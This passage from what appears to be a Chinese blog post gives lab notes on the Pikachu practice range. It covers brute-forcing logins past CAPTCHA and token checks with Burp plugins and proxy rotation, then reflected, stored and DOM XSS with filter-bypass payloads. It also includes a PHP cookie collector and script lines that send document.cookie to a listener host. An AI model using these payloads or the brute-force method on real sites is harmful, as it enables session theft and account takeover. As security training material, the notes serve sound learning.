&#123;</span><br><span class="line">    <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">        <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">createCode</span>();</span><br></pre></td></tr></table></figure><p>可以看到验证码是在前端生成和验证的，所以我们试试抓包然后爆破</p><p><img src="/../image/image-20240319160100182-1723344400344-221.png" alt="image-20240319160100182"></p><p><img src="/../image/image-20240319160429831-1723344400344-223.png" alt="image-20240319160429831"></p><p>当然也有另一种方法，先F12,再F1，选择禁用JavaScript</p><p><img src="/../image/image-20240319160624787-1723344400344-224.png" alt="image-20240319160624787"></p><p>然后就不用输入验证码了</p><p><img src="/../image/image-20240319160610927-1723344400344-225.png" alt="image-20240319160610927"></p><h2 id="1-4-token防爆破？"><a href="#1-4-token防爆破？" class="headerlink" title="1.4.token防爆破？"></a>1.4.token防爆破？</h2><blockquote><p> “token”通常指的是一个用于验证用户身份和授权访问的令牌。它是一种特殊的字符串或代码，由服务器生成并分配给经过身份验证的用户。用户在成功登录后，服务器会颁发一个token给客户端（例如Web浏览器），客户端将在随后的请求中将该token作为身份验证凭据发送给服务器。</p></blockquote><p><img src="/../image/image-20240319160859595-1723344400344-222.png" alt="image-20240319160859595"></p><p>对于有token的的验证，我们适用于<strong>已经知道账号</strong>的情况，或者账号和密码一一对应的情况，并且我们的暴力破解方式就要有所调整，我们依旧是先抓包，并发送到攻击模块</p><p>我们这里的攻击目标要选择password，以及token，攻击方式选择Pitchfork</p><p><img src="/../image/image-20240319161255693-1723344400344-226.png" alt="image-20240319161255693"></p><p>下面我们来到payloads模块，password设置和之前一样，上传我们的爆破字典即可，第二个位置token处进行如下设置，我们首先来到Options模块</p><p><img src="/../image/image-20240319161608628-1723344400344-228.png" alt="image-20240319161608628"></p><p><img src="/../image/image-20240319161648805-1723344400344-229.png" alt="image-20240319161648805"></p><p><img src="/../image/image-20240319161722620-1723344400344-227.png" alt="image-20240319161722620"></p><p>我们将刷新的请求中的数据包下滑，大约在927行左右找到token，选中并且复制，然后点击ok</p><p><img src="/../image/image-20240319161809459-1723344400344-230.png" alt="image-20240319161809459"></p><p><img src="/../image/image-20240319161826920-1723344400344-231.png" alt="image-20240319161826920"></p><p>我们再回到payloads模块，前两个位置和前几关一样，正常选择字典即可，第二个位置选择Secursive grep（递归搜索），并且将我们刚刚复制的token粘贴到下面的框里，开始攻击即可。</p><p><img src="/../image/image-20240319161949347-1723344400344-232.png" alt="image-20240319161949347"></p><p>如果出现以下错误</p><p><img src="/../image/image-20240319162031266-1723344400344-233.png" alt="image-20240319162031266"></p><p>我们来到resource pool模块，选择创建新的资源池，并把最大请求数改为1，然后开始攻击即可</p><p><img src="/../image/image-20240319162110973-1723344400344-234.png" alt="image-20240319162110973"></p><p><img src="/../image/image-20240319162225198-1723344400344-235.png" alt="image-20240319162225198"></p><h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><h2 id="1-无验证码的爆破"><a href="#1-无验证码的爆破" class="headerlink" title="1.无验证码的爆破"></a>1.无验证码的爆破</h2><p>设置代理，这样出口ip就会发生变化</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902152433045.png" alt="image-20240902152433045"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902152559551.png" alt="image-20240902152559551"></p><p>访问目标网址</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902152623491.png" alt="image-20240902152623491"></p><p>抓包</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902152654918.png" alt="image-20240902152654918"></p><p>发送到intruder模块爆破，这里就不替换帐号了，只对密码进行替换</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902153002909.png" alt="image-20240902153002909"></p><p>导入自己下载的字典</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902153057663.png" alt="image-20240902153057663"></p><p>开始爆破即可</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902153140289.png" alt="image-20240902153140289"></p><p>可以根据状态码和返回包长度进行结果的判断，这里是一个没成，这个和字典的好坏有关，这里只是学习测试用</p><h2 id="2-带验证码的爆破"><a href="#2-带验证码的爆破" class="headerlink" title="2.带验证码的爆破"></a>2.带验证码的爆破</h2><p>工欲善其事必先利其器，我们先来学下需要用到两个的插件</p><ul><li><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></li></ul><p><a href="https://blog.csdn.net/zdn2325/article/details/125523694">https://blog.csdn.net/zdn2325/article/details/125523694</a></p><p>下载好server.py和对应jdk版本的jar包，启动server.py</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902155312577.png" alt="image-20240902155312577"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902155327169.png" alt="image-20240902155327169"></p><p>在bp中添加插件</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902155512819.png" alt="image-20240902155512819"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902155533623.png" alt="image-20240902155533623"></p><p>复制图片的url地址到burp的xiapao插件里面对应的位置，我这里选用的是编号为2，所以对应的关键字就是@xiapao@1@，这里有两个识别方式muggle_ocr和ddddocr，这两种都可以使用自己辨别那个正确率高就用哪个。我这里用的第一个。上面的瞎跑接口就是默认的接口。右边的三个全部勾上，保存配置。<br><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902155719467.png" alt="image-20240902155719467"></p><p>抓网页的包</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902155836530.png" alt="image-20240902155836530"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160004457.png" alt="image-20240902160004457"></p><p>如果没有回包，记得把前面设置的proxy关闭，然后有这种空格是编码问题，可以先复制到txt文本文件里查看，也可以在设置里搜索font，把编码方式换成宋体等</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160249326.png" alt="image-20240902160249326"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160300561.png" alt="image-20240902160300561"></p><p>下面把包发送到intruder然后code换成我们刚刚的@xiapao@1@</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160438048.png" alt="image-20240902160438048"></p><p>配置好字典，然后线程池数量调成1</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160540941.png" alt="image-20240902160540941"></p><p>然后有问题的话应该是post方法导致的，你可以试着把整个post包放到xiapao里</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160858013.png" alt="image-20240902160858013"></p><p>然后开始爆破</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160924118.png" alt="image-20240902160924118"></p><p>这种就是匹配失败</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902160947253.png" alt="image-20240902160947253"></p><p>这种是匹配成功</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902161011141.png" alt="image-20240902161011141"></p><p>这种就是太频繁导致ip被ban了，可以通过切换代理地址的方式解决，可以试着开启sockets proxy，这里是vpn环境所以被限制了，在xiapao日志里也可以看到匹配结果</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902161342769.png" alt="image-20240902161342769"></p><p>下面介绍第二种工具</p><ul><li><a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></li><li><a href="https://www.cnblogs.com/4geek/p/17145385.html#!comments">https://www.cnblogs.com/4geek/p/17145385.html#!comments</a></li></ul><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902161403080.png" alt="image-20240902161403080"></p><p>同样的下载响应的包和服务，导入burp</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902161726316.png" alt="image-20240902161726316"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902161749016.png" alt="image-20240902161749016"></p><p>这个界面会比刚刚的简洁一点，先启动下服务</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902161916127.png" alt="image-20240902161916127"></p><p>访问生成验证码的接口，获取请求包</p><p><a href="http://172.168.20.140:8110/xyhai.php?s=/Login/verify/id/a_login_1">http://172.168.20.140:8110/xyhai.php?s=/Login/verify/id/a_login_1</a></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902162955486.png" alt="image-20240902162955486"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163008365.png" alt="image-20240902163008365"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163024410.png" alt="image-20240902163024410"></p><p>在这里就可以看到获取到的验证码，接下来配置接口URL，地址栏中输入<a href="http://127.0.0.1:8888，然后在Request">http://127.0.0.1:8888，然后在Request</a> template中右键在模板库中选择ddddocr：</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163231805.png" alt="image-20240902163231805"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163348301.png" alt="image-20240902163348301"></p><p>然后获取-》识别看右边的结果，然后开始爆破配置</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163553930.png" alt="image-20240902163553930"></p><p>因为有两个参数且互相关联要同时变化，所以用这个模式pitchfork，第一个参数导入密码字典</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163627586.png" alt="image-20240902163627586"></p><p>第二个参数选择我们的拓展插件生成的验证码</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163717941.png" alt="image-20240902163717941"></p><p>线程池还是同一个</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902163732411.png" alt="image-20240902163732411"></p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902164411003.png" alt="image-20240902164411003"></p><p>用的时候记得勾选这个</p><p><img src="C:/Users/yxz/AppData/Roaming/Typora/typora-user-images/image-20240902164428743.png" alt="image-20240902164428743"></p><p>识别好像还行，但爆破结果好像不怎么样，不如前一个，应该是我没配置好</p><h1 id="2-XSS漏洞"><a href="#2-XSS漏洞" class="headerlink" title="2. XSS漏洞"></a>2. XSS漏洞</h1><p>XSS（跨站脚本）概述<br>    Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><p>​        1.反射性XSS;</p><p>​        2.存储型XSS;</p><p>​        3.DOM型XSS;</p><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;<br>你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。 </p><h2 id="2-1-反射型-get"><a href="#2-1-反射型-get" class="headerlink" title="2.1 反射型(get)"></a>2.1 反射型(get)</h2><p>​反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS 代码。反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。</p><p><img src="/../image/image-20240328160844874-1723344400344-236.png" alt="image-20240328160844874"></p><p>敲到这里，发现敲不进去了，F12修改一下这里的长度限制</p><p><img src="/../image/image-20240328160934463-1723344400344-237.png" alt="image-20240328160934463"></p><p><img src="/../image/image-20240328160949052-1723344400344-238.png" alt="image-20240328160949052"></p><h2 id="2-2-反射型-post"><a href="#2-2-反射型-post" class="headerlink" title="2.2 反射型(post)"></a>2.2 反射型(post)</h2><p><img src="/../image/image-20240328161210806-1723344400344-239.png" alt="image-20240328161210806"></p><p>同样的句子，<strong>两者区别：get型提交的数据会显示在url中，而post不会。</strong></p><p><img src="/../image/image-20240328161355688-1723344400344-240.png" alt="image-20240328161355688"></p><p>但练习xss获取cookie，我们试试，要有一个接收的服务器，这里我们用kali快速搭建一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br></pre></td></tr></table></figure><p>在服务器中准备一个test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思是将cookie保存到$cookie函数中然后保存到cookie.txt文件中</p><p>我们再创建一个cookie.txt文件</p><p>然后我们利用反射型xss进行攻击，首先来构造一个payload，我们接收cookie的地址为</p><p><a href="http://192.168.174.137:9966/test.php">http://192.168.174.137:9966/test.php</a></p><p><img src="/../image/image-20240328164048923-1723344400344-241.png" alt="image-20240328164048923"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://192.168.174.137:9966/test.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /test.php?cookie=ant[uname]=admin;%20ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;%20PHPSESSID=qptcbc76h4b9sonl89b7pmmckc HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>用不同的账户登陆，比如test</p><p><img src="/../image/image-20240328165137608-1723344400344-242.png" alt="image-20240328165137608"></p><p>刷新浏览器，抓包</p><p><img src="/../image/image-20240328165407385-1723344400344-243.png" alt="image-20240328165407385"></p><p>把cookie替换为我们抓到的值</p><h2 id="2-3-存储型"><a href="#2-3-存储型" class="headerlink" title="2.3 存储型"></a>2.3 存储型</h2><p>存储型 XSS，持久化，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成xss 攻击。</p><p><img src="/../image/image-20240328170155187-1723344400344-244.png" alt="image-20240328170155187"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>提交时会弹窗，刷也会，这是因为语句被存入数据库，数据库每次查询完都会执行一次。</p><h2 id="2-4-DOM型xss"><a href="#2-4-DOM型xss" class="headerlink" title="2.4 DOM型xss"></a>2.4 DOM型xss</h2><p>DOM，全称 DocumentObject Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM 型 XSS 其实是一种特殊类型的反射型 XSS,它是基于 DOM 文档对象模型的一种漏洞。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。</p><p>以下是一些经常出现 dom xss 的关键语句</p><p>document.referer 属性</p><p>window.name 属性</p><p>location 属性</p><p>innerHTML属性</p><p>documen.write 属性</p><p><img src="/../image/image-20240328170511209-1723344400344-245.png" alt="image-20240328170511209"></p><p>输入个1试试，点一下，会访问&#x2F;vul&#x2F;xss&#x2F;1,所以我们可以试着将这个链接重定向到别的地方。</p><p>js函数也给了提示</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240328170725121-1723344400344-246.png" alt="image-20240328170725121"></p><p>当我们鼠标悬停在img上时就会弹出，onlick是点击</p><h3 id="2-4-1-DOM-xss-x"><a href="#2-4-1-DOM-xss-x" class="headerlink" title="2.4.1 DOM-xss-x"></a>2.4.1 DOM-xss-x</h3><p>输入个1试试，发现有个链接，然后url中传了个参数</p><p><img src="/../image/image-20240328171043699-1723344400345-247.png" alt="image-20240328171043699"></p><p>先点击链接试试</p><p><img src="/../image/image-20240328171128496-1723344400345-248.png" alt="image-20240328171128496"></p><p>多了个链接，再点击试试，和前面那个一样</p><p>先试试直接传参数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert%<span class="number">28</span>%27xss%<span class="number">27</span>%<span class="number">29</span>%3B&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure><p>发现有些符号被转码了，再点击试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(</span><br></pre></td></tr></table></figure><p>最终只剩下这些东西了,查看网页源代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">    <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                </span><br></pre></td></tr></table></figure><p>它的输入实际上是从url上获取的，这就类似反射性。</p><p><img src="/../image/image-20240328172514259-1723344400345-250.png" alt="image-20240328172514259"></p><p>这个replace函数还要特意去看一下，有一些正则表达式</p><p>正则表达式 <code>/\+/g</code> 是用来匹配字符串中的 <code>+</code> 字符的。</p><p>其中：</p><ul><li><code>/</code> 是正则表达式的起始和结束符号。</li><li><code>\/</code> 匹配一个正斜杠字符 <code>/</code>。</li><li><code>\+</code> 匹配一个加号字符 <code>+</code>。由于加号 <code>+</code> 在正则表达式中有特殊含义（表示匹配前一个字符一次或多次），因此需要使用反斜杠 <code>\</code> 进行转义，以表示字面意义上的加号字符。</li><li><code>g</code> 是全局匹配标志，表示在整个字符串中查找所有匹配项，而不仅仅是第一个匹配项。</li></ul><h2 id="2-5-xss盲打"><a href="#2-5-xss盲打" class="headerlink" title="2.5 xss盲打"></a>2.5 xss盲打</h2><p><img src="/../image/image-20240328204846100-1723344400345-249.png" alt="image-20240328204846100"></p><p>看了下源代码没什么线索，直接输入语句测试一下，没反应，tip提示登陆</p><p><img src="/../image/image-20240328205221497-1723344400345-252.png" alt="image-20240328205221497"></p><p>发现登陆时会弹出来</p><p><img src="/../image/image-20240328205245592-1723344400345-253.png" alt="image-20240328205245592"></p><p><img src="/../image/image-20240328205308962-1723344400345-254.png" alt="image-20240328205308962"></p><p>可以看到虽然没有显示，但查看元素的时候还是有的，说明数据被存入数据库了。</p><p><img src="/../image/image-20240328211450315-1723344400345-251.png" alt="image-20240328211450315"></p><p>这个用docker搭建的靶场，数据库还有点难进，不知道密码。。。只能先配置跳过了</p><h2 id="2-6-xss之过滤"><a href="#2-6-xss之过滤" class="headerlink" title="2.6 xss之过滤"></a>2.6 xss之过滤</h2><p><img src="/../image/image-20240328211808505-1723344400345-255.png" alt="image-20240328211808505"></p><p>看了下，源代码里没什么线索</p><p><img src="/../image/image-20240328212138815-1723344400345-256.png" alt="image-20240328212138815"></p><p>在用”onclick&#x3D;”alert(‘xss’)”&gt;,发现整个句子都被反回来了</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">’&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;‘</span><br></pre></td></tr></table></figure><p>试了下这一句</p><p><img src="/../image/image-20240328212701150-1723344400345-257.png" alt="image-20240328212701150"></p><p><img src="/../image/image-20240328212717660-1723344400345-258.png" alt="image-20240328212717660"></p><p>试试大写，也不行，试试混写</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scRIPt&gt;<span class="title function_">alert</span>(<span class="number">666</span>)&lt;/<span class="title class_">ScrIpt</span>&gt;</span><br></pre></td></tr></table></figure><p>这句可以</p><p><img src="/../image/image-20240328213928289-1723344400345-261.png" alt="image-20240328213928289"></p><h2 id="2-7-xss之htmlspecialchars"><a href="#2-7-xss之htmlspecialchars" class="headerlink" title="2.7 xss之htmlspecialchars"></a>2.7 xss之htmlspecialchars</h2><p>这是一个php的函数会把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体：</p><p><img src="/../image/image-20240328214323457-1723344400345-260.png" alt="image-20240328214323457"></p><p>我们发现除了单引号其他的特殊字符都进行了编码，我们可以输入<code>q&#39; onclick=&#39;alert(666)&#39;</code>第一个单引号是对前面进行闭合。</p><p><img src="/../image/image-20240328215125664-1723344400345-262.png" alt="image-20240328215125664"></p><p>发现是 a 标签 所以可以使用 javascript:alert(&#x2F;xss&#x2F;)  </p><p><img src="/../image/image-20240328215425841-1723344400345-259.png" alt="image-20240328215425841"></p><h2 id="2-8-xss之href输出"><a href="#2-8-xss之href输出" class="headerlink" title="2.8 xss之href输出"></a>2.8 xss之href输出</h2><p><img src="/../image/image-20240328215726438-1723344400345-263.png" alt="image-20240328215726438"></p><p><img src="/../image/image-20240328215708091-1723344400345-264.png" alt="image-20240328215708091"></p><p>同样是a标签</p><h2 id="2-9-xss之js输出"><a href="#2-9-xss之js输出" class="headerlink" title="2.9 xss之js输出"></a>2.9 xss之js输出</h2><p>查看下源码，可以找到函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ms=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">        $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">        $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入tmac发现确实会返回，尝试下闭合</p><p><img src="/../image/image-20240328220100804-1723344400345-265.png" alt="image-20240328220100804"></p><p>输入<code>1&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，先将前面的script闭合再插入我们自己的语句</p><p><img src="/../image/image-20240328220454515-1723344400345-266.png" alt="image-20240328220454515"></p><p><img src="/../image/image-20240328220702544-1723344400345-267.png" alt="image-20240328220702544"></p><h2 id="2-10-xss之获取cookie"><a href="#2-10-xss之获取cookie" class="headerlink" title="2.10 xss之获取cookie"></a>2.10 xss之获取cookie</h2><h3 id="2-10-1-get"><a href="#2-10-1-get" class="headerlink" title="2.10.1 get"></a>2.10.1 get</h3><p>这里我们利用pikachu’自带的工具测试</p><p><img src="/../image/image-20240329161554975-1723344400345-269.png" alt="image-20240329161554975"></p><p><img src="/../image/image-20240329161606545-1723344400345-270.png" alt="image-20240329161606545"></p><p><img src="/../image/image-20240329161614904-1723344400345-268.png" alt="image-20240329161614904"></p><p>构造语句</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://192.168.174.142:8080/pkxss/xcookie/cookie.php?cookie=&#x27;</span> +<span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后在get中插入xss语句，会在后台得到PHPSSID</p><p><img src="/../image/image-20240329162123946-1723344400345-271.png" alt="image-20240329162123946"></p><p>执行之后，跳转到pikachu&#x2F;index.php，因为我这里docker配置的环境，所以没有更改目标地址，所以可能访问不到这个页面，可以自己修改</p><p><img src="/../image/image-20240329162625896-1723344400345-272.png" alt="image-20240329162625896"></p><h3 id="2-10-2-post"><a href="#2-10-2-post" class="headerlink" title="2.10.2 post"></a>2.10.2 post</h3><p>输入账号密码登录，页面跳转，因为post类型，所以参数没有在url中显示。得抓包才能看到</p><p><img src="/../image/image-20240329163059311-1723344400345-273.png" alt="image-20240329163059311"></p><p>我们发现message是通过请求体返回，通过post方式传到后台。这样的话是不能把恶意代码嵌入url中。<br>POST型XSS获取cookie原理</p><p><img src="https://img-blog.csdnimg.cn/e41fb37c84cf41c49532f87f16977cb0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd3lkMjAwMQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>我们需要自己搭一个<strong>恶意站点</strong>，然后在网站上放一个post表单，将存放POST表单的链接发送给受害者，诱导受害者点击。 这个POST表单会自动向漏洞服务器提交一个POST请求，实现受害者帮我们提交POST请求的目的。我们只需要诱导受害者点击上面的链接就能窃取用户的Cookie。</p><h2 id="2-11-xss之钓鱼PHP中Header函数和PHP-AUTH-USER做用户验证"><a href="#2-11-xss之钓鱼PHP中Header函数和PHP-AUTH-USER做用户验证" class="headerlink" title="2.11 xss之钓鱼PHP中Header函数和PHP_AUTH_USER做用户验证"></a>2.11 xss之钓鱼<a href="https://cloud.tencent.com/developer/article/1679778?areaId=106001">PHP中Header函数和PHP_AUTH_USER做用户验证</a></h2><p><img src="https://img-blog.csdnimg.cn/365a36f1b85e4915912f80427bd1d858.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd3lkMjAwMQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在开始之前，需要修改一下fish.php文件</p><p><img src="/../image/image-20240329171826373-1723344400345-274.png" 